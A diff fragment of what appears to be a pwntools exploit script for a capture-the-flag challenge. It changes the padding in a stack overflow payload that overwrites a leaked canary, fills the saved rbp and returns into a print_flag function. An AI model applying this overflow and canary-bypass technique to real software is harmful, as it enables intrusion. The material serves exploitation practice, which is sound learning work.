@@ -20,7 +20,7 @@ win = exe.symbols['print_flag']
 # log.info(hex(win))
 
 payload = (
-    b"A" * 64 +      # fill message buffer
+    b"A" * 0x48 +    # reach the canary (message buffer + padding)
     p64(canary) +    # overwrite canary with leaked value
     b"B" * 8 +       # saved rbp filler
     p64(win)         # return into print_flag
